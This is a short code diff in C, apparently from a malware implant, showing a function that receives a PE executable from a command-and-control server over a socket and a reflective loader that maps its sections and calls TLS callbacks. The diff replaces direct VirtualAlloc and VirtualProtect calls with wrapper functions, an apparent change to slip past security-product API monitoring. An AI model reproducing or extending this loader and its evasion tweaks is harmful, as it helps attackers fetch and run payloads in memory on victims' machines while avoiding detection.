@@ -25,7 +25,7 @@ PBYTE GetPEFromC2(SOCKET* s, PC2_PACKET pFirstPkt) {
     printf("[*] Preparing to receive PE of %zu bytes...\n", totalSize);
 
     // Allocate memory
-    PBYTE peBuffer = (PBYTE)VirtualAlloc(NULL, totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    PBYTE peBuffer = (PBYTE)WrapperVirtualAlloc(NULL, totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!peBuffer) {
         printf("[!] VirtualAlloc failed\n");
         return NULL;
@@ -220,7 +220,7 @@ VOID ExecutePELoader(PBYTE pe_base) {
         else
             protect = writable ? PAGE_READWRITE : PAGE_READONLY;
 
-        VirtualProtect(pe_loaded_base + section->VirtualAddress, section->Misc.VirtualSize, protect, &oldProtect);
+        WrapperVirtualProtect(pe_loaded_base + section->VirtualAddress, section->Misc.VirtualSize, protect, &oldProtect);
     }
 
     printf("[*] Calling TLS Callbacks\n");
